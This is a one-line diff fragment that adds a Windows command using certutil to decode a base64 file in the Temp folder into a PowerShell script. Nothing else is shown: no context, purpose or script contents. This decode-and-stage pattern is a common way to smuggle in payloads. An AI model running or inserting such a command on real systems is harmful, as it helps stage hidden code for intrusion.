@@ -1,0 +1,2 @@
+﻿certutil.exe -decode -f C:\Windows\Temp\rn.b64 C:\Windows\Temp\rn.ps1
+
